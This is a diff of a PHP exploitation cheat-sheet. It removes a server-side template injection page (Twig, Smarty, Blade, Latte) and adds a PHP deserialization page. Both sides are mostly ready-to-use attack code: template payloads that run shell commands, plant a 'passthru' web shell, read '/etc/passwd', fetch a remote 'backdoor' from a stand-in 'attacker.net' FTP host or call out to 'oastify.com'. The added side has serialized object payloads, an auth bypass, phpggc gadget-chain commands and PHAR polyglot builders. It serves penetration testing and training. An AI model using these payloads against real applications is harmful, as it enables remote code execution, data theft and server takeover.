@@ -1,346 +1,261 @@
-# Server Side Template Injection - PHP
+# PHP Deserialization
 
-> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.
+> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
 
 ## Summary
 
-- [Templating Libraries](#templating-libraries)
-- [Universal Payloads](#universal-payloads)
-- [Blade](#blade)
-- [Smarty](#smarty)
-    - [Smarty - Code Execution with Obfuscation](#smarty---code-execution-with-obfuscation)
-- [Twig](#twig)
-    - [Twig - Basic Injection](#twig---basic-injection)
-    - [Twig - Template Format](#twig---template-format)
-    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
-    - [Twig - Code Execution](#twig---code-execution)
-    - [Twig - Code Execution with Obfuscation](#twig---code-execution-with-obfuscation)
-- [Latte](#latte)
-    - [Latte - Basic Injection](#latte---basic-injection)
-    - [Latte - Code Execution](#latte---code-execution)
-- [patTemplate](#pattemplate)
-- [PHPlib](#phplib-and-html_template_phplib)
-- [Plates](#plates)
-- [References](#references)
+* [General Concept](#general-concept)
+* [Authentication Bypass](#authentication-bypass)
+* [Object Injection](#object-injection)
+* [Finding and Using Gadgets](#finding-and-using-gadgets)
+* [Phar Deserialization](#phar-deserialization)
+* [Real World Examples](#real-world-examples)
+* [References](#references)
 
-## Templating Libraries
+## General Concept
 
-| Template Name   | Payload Format |
-|-----------------|----------------|
-| Blade (Laravel) | `{{ }}`        |
-| Latte           | `{ }`          |
-| Mustache        | `{{ }}`        |
-| Plates          | `<?= ?>`       |
-| Smarty          | `{ }`          |
-| Twig            | `{{ }}`        |
+The following magic methods will help you for a PHP Object injection
 
-## Universal Payloads
+* `__wakeup()` when an object is unserialized.
+* `__destruct()` when an object is deleted.
+* `__toString()` when an object is converted to a string.
 
-Generic code injection payloads work for many PHP-based template engines, such as Blade, Latte and Smarty.
+Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.
 
-To use these payloads, wrap them in the appropriate tag.
+Vulnerable code:
 
 ```php
-// Rendered RCE
-shell_exec('id')
-system('id')
-
-// Error-Based RCE
-ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
-call_user_func(join("", ["xx", shell_exec('id')]))
-
-// Boolean-Based RCE
-1 / (pclose(popen("id", "wb")) == 0)
-
-// Time-Based RCE
-shell_exec('id && sleep 5')
-system('id && sleep 5')
-```
-
-## Blade
-
-> Universal payloads also work for Blade.
-
-[Official website](https://laravel.com/docs/master/blade)
-> Blade is the simple, yet powerful templating engine that is included with Laravel.
-
-The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.
-
-```php
-{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
-```
-
-Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
-
----
-
-## Smarty
-
-> Universal payloads also work for Smarty before v5.
-
-[Official website](https://www.smarty.net/docs/en/)
-> Smarty is a template engine for PHP.
-
-```php
-{$smarty.version}
-{php}echo `id`;{/php} //deprecated in smarty v3
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-{system('ls')} // compatible v3, deprecated in v5
-{system('cat index.php')} // compatible v3, deprecated in v5
-```
-
-### Smarty - Code Execution with Obfuscation
-
-By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.
-
-Execute system comman (command: `id`):
-
-```php
-{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
-```
-
-Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
-
----
-
-## Twig
-
-[Official website](https://twig.symfony.com/)
-> Twig is a modern template engine for PHP.
-
-### Twig - Basic Injection
-
-```php
-{{7*7}}
-{{7*'7'}} would result in 49
-{{dump(app)}}
-{{dump(_context)}}
-{{app.request.server.all|join(',')}}
-```
-
-### Twig - Template Format
-
-```php
-$output = $twig > render (
-  'Dear' . $_GET['custom_greeting'],
-  array("first_name" => $user.first_name)
-);
-
-$output = $twig > render (
-  "Dear {first_name}",
-  array("first_name" => $user.first_name)
-);
-```
-
-### Twig - Arbitrary File Reading
-
-```php
-"{{'/etc/passwd'|file_excerpt(1,30)}}"@
-{{include("wp-config.php")}}
-```
-
-### Twig - Code Execution
-
-```php
-{{self}}
-{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|filter('system')}}
-{{[0]|reduce('system','id')}}
-{{['id']|map('system')|join}}
-{{['id',1]|sort('system')|join}}
-{{['cat\x20/etc/passwd']|filter('system')}}
-{{['cat$IFS/etc/passwd']|filter('system')}}
-{{['id']|filter('passthru')}}
-{{['id']|map('passthru')}}
-{{['nslookup oastify.com']|filter('system')}}
-
-{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
-{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
-{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0
-
-{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
-{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
-
-{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
-{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
-```
-
-With certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in these cases:
-
-```php
-{{ {'id':'shell_exec'}|map('call_user_func')|join }}
-```
-
-Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
-
-```python
-FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
-```
-
-Example with an email passing FILTER_VALIDATE_EMAIL PHP.
-
-```powershell
-POST /subscribe?0=cat+/etc/passwd HTTP/1.1
-email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
-```
-
-### Twig - Code Execution with Obfuscation
-
-Twig's block feature and built-in `_charset` variable can be nesting can be used to produced the payload (command: `id`)
-
-```twig
-{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
-```
-
-The following payload, which harnesses the built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:
-
-```twig
-{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
-```
-
-Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
-
----
-
-## Latte
-
-> Universal payloads also work for Latte.
-
-### Latte - Basic Injection
-
-```php
-{var $X="POC"}{$X}
-```
-
-### Latte - Code Execution
-
-```php
-{php system('nslookup oastify.com')}
-```
-
----
-
-## patTemplate
-
-> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts
-
-```xml
-<patTemplate:tmpl name="page">
-  This is the main page.
-  <patTemplate:tmpl name="foo">
-    It contains another template.
-  </patTemplate:tmpl>
-  <patTemplate:tmpl name="hello">
-    Hello {NAME}.<br/>
-  </patTemplate:tmpl>
-</patTemplate:tmpl>
-```
-
----
-
-## PHPlib and HTML_Template_PHPLIB
-
-[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.
-
-`authors.tpl`
-
-```html
-<html>
- <head><title>{PAGE_TITLE}</title></head>
- <body>
-  <table>
-   <caption>Authors</caption>
-   <thead>
-    <tr><th>Name</th><th>Email</th></tr>
-   </thead>
-   <tfoot>
-    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
-   </tfoot>
-   <tbody>
-<!-- BEGIN authorline -->
-    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
-<!-- END authorline -->
-   </tbody>
-  </table>
- </body>
-</html>
-```
-
-`authors.php`
-
-```php
-<?php
-//we want to display this author list
-$authors = array(
-    'Christian Weiske'  => 'cweiske@php.net',
-    'Bjoern Schotte'     => 'schotte@mayflower.de'
-);
-
-require_once 'HTML/Template/PHPLIB.php';
-//create template object
-$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
-//load file
-$t->setFile('authors', 'authors.tpl');
-//set block
-$t->setBlock('authors', 'authorline', 'authorline_ref');
-
-//set some variables
-$t->setVar('NUM_AUTHORS', count($authors));
-$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));
-
-//display the authors
-foreach ($authors as $name => $email) {
-    $t->setVar('AUTHOR_NAME', $name);
-    $t->setVar('AUTHOR_EMAIL', $email);
-    $t->parse('authorline_ref', 'authorline', true);
-}
-
-//finish and echo
-echo $t->finish($t->parse('OUT', 'authors'));
+<?php 
+    class PHPObjectInjection{
+        public $inject;
+        function __construct(){
+        }
+        function __wakeup(){
+            if(isset($this->inject)){
+                eval($this->inject);
+            }
+        }
+    }
+    if(isset($_REQUEST['r'])){  
+        $var1=unserialize($_REQUEST['r']);
+        if(is_array($var1)){
+            echo "<br/>".$var1[0]." - ".$var1[1];
+        }
+    }
+    else{
+        echo ""; # nothing happens here
+    }
 ?>
 ```
 
----
+Craft a payload using existing code inside the application.
 
-## Plates
+* Basic serialized data
 
-Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.
+    ```php
+    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
+    ```
 
-controller:
+* Command execution
 
-```php
-// Create new Plates instance
-$templates = new League\Plates\Engine('/path/to/templates');
+    ```php
+    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
+    ```
 
-// Render a template
-echo $templates->render('profile', ['name' => 'Jonathan']);
-```
+## Authentication Bypass
 
-page template:
+### Type Juggling
 
-```php
-<?php $this->layout('template', ['title' => 'User Profile']) ?>
-
-<h1>User Profile</h1>
-<p>Hello, <?=$this->e($name)?></p>
-```
-
-layout template:
+Vulnerable code:
 
 ```php
-<html>
-  <head>
-    <title><?=$this->e($title)?></title>
-  </head>
-  <body>
-    <?=$this->section('content')?>
-  </body>
-</html>
+<?php
+$data = unserialize($_COOKIE['auth']);
+
+if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
+    $admin = true;
+} else {
+    $admin = false;
+}
 ```
+
+Payload:
+
+```php
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+```
+
+Because `true == "str"` is true.
+
+## Object Injection
+
+Vulnerable code:
+
+```php
+<?php
+class ObjectExample
+{
+  var $guess;
+  var $secretCode;
+}
+
+$obj = unserialize($_GET['input']);
+
+if($obj) {
+    $obj->secretCode = rand(500000,999999);
+    if($obj->guess === $obj->secretCode) {
+        echo "Win";
+    }
+}
+?>
+```
+
+Payload:
+
+```php
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
+```
+
+We can do an array like this:
+
+```php
+a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
+```
+
+## Finding and Using Gadgets
+
+Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
+
+* In PHP source code, look for `unserialize()` function.
+* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
+    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
+    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
+    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
+    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
+    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
+    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
+    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
+    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
+    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
+    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
+    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
+    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
+    * `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
+    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
+    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
+    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
+    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)
+
+[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
+
+* Laravel
+* Symfony
+* SwiftMailer
+* Monolog
+* SlimPHP
+* Doctrine
+* Guzzle
+
+```powershell
+phpggc monolog/rce1 'phpinfo();' -s
+phpggc monolog/rce1 assert 'phpinfo()'
+phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
+phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
+```
+
+## Phar Deserialization
+
+Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
+
+A valid PHAR includes four elements:
+
+1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
+2. **Manifest**: Contains metadata about the archive and its contents.
+3. **File Contents**: Contains the actual files in the archive.
+4. **Signature**(optional): For verifying archive integrity.
+
+* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+
+    ```php
+    <?php
+    class PDFGenerator { }
+
+    //Create a new instance of the Dummy class and modify its property
+    $dummy = new PDFGenerator();
+    $dummy->callback = "passthru";
+    $dummy->fileName = "uname -a > pwned"; //our payload
+
+    // Delete any existing PHAR archive with that name
+    @unlink("poc.phar");
+
+    // Create a new archive
+    $poc = new Phar("poc.phar");
+
+    // Add all write operations to a buffer, without modifying the archive on disk
+    $poc->startBuffering();
+
+    // Set the stub
+    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+    /* Add a new file in the archive with "text" as its content*/
+    $poc["file"] = "text";
+    // Add the dummy object to the metadata. This will be serialized
+    $poc->setMetadata($dummy);
+    // Stop buffering and write changes to disk
+    $poc->stopBuffering();
+    ?>
+    ```
+
+* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
+
+    ```php
+    <?php
+    class AnyClass {
+        public $data = null;
+        public function __construct($data) {
+            $this->data = $data;
+        }
+        
+        function __destruct() {
+            system($this->data);
+        }
+    }
+
+    // create new Phar
+    $phar = new Phar('test.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test.txt', 'text');
+    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+
+    // add object of any class as meta data
+    $object = new AnyClass('whoami');
+    $phar->setMetadata($object);
+    $phar->stopBuffering();
+    ```
+
+## Real World Examples
+
+* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
+* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
+* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
+* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)
 
 ## References
 
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
-- [Server Side Template Injection (SSTI) via Twig escape handler - Grav - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
-- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
+* [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://web.archive.org/web/20210514112950/https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
+* [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
+* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 1 - Rémi Matasse - September 12, 2023](https://web.archive.org/web/20230915040126/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
+* [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 2 - Rémi Matasse - October 11, 2023](https://web.archive.org/web/20231017130212/https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
+* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - xanhacks - August 11, 2022](https://web.archive.org/web/20250926045827/https://www.xanhacks.xyz/p/php-gadget-chain/)
+* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://web.archive.org/web/20200929143500/https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
+* [phar:// deserialization - HackTricks - July 19, 2024](https://web.archive.org/web/20220819225041/https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
+* [PHP deserialization attacks and a new gadget chain in Laravel - Mathieu Farrell - February 13, 2024](https://web.archive.org/web/20240213181951/https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
+* [PHP Generic Gadget - Charles Fol - July 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)
+* [PHP Internals Book - Serialization - jpauli - June 15, 2013](https://web.archive.org/web/20130615052058/http://www.phpinternalsbook.com:80/classes_objects/serialization.html)
+* [PHP Object Injection - Egidio Romano - April 24, 2020](https://web.archive.org/web/20130313225253/https://www.owasp.org/index.php/PHP_Object_Injection)
+* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://web.archive.org/web/20200903232359/https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
+* [PHP unserialize - php.net - March 29, 2001](https://web.archive.org/web/20260219122641/https://www.php.net/manual/en/function.unserialize.php)
+* [POC2009 Shocking News in PHP Exploitation - Stefan Esser - May 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
+* [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://web.archive.org/web/20241010013739/https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
+* [TSULOTT Web challenge write-up - MeePwn CTF - Rawsec - July 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
+* [Utilizing Code Reuse/ROP in PHP - Stefan Esser - June 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
